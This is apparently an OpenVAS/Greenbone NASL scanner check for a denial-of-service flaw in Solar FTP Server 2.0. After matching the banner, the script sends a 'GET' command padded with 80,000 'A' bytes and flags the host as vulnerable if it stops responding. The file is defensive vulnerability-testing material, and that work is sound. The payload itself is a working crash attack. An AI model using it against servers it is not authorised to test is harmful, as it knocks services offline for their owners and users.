# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800190");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("SolarFTP Server Multiple Commands Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15750/");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/solarftp/detected");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash.");

  script_tag(name:"affected", value:"Solar FTP Server Version 2.0.");

  script_tag(name:"insight", value:"The flaw is due to the way server handles certain commands
  'APPE', 'GET', 'PUT', 'NLST' and 'MDTM' along with long data causing Denial of Service.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Solar FTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "220 " >!< banner || "Solar FTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}
resp =  recv_line(socket:soc, length:100);

attack = string("GET ", crap(data: raw_string(0x41), length: 80000), "\r\n");
send(socket:soc, data:attack);
resp = recv_line(socket:soc, length:260);

if(!resp)
{
  security_message(port:ftpPort);
  exit(0);
}

ftp_close(socket:soc);
